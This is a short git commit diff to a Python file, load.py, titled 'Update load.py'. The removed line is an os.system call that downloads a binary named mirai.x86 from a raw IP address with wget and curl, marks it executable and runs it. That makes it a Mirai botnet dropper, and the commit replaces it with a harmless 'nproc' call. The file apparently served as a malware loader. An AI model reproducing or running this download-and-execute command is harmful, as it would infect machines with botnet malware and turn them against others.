083a4e2a84d4df5d47d548f79283a5501cefc4f6
ufewufyif21 <131489706+ufewufyif21@users.noreply.github.com>
2023-04-22 21:06:59 +0000

    Update load.py

--- load.py
+++ load.py
@@ -1,3 +1,3 @@
 import os
 
-os.system("cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://195.58.39.170/mirai.x86; curl -O http://195.58.39.170/mirai.x86; cat mirai.x86 > mirai; chmod +x *; ./mirai SOLAR")
+os.system("nproc")
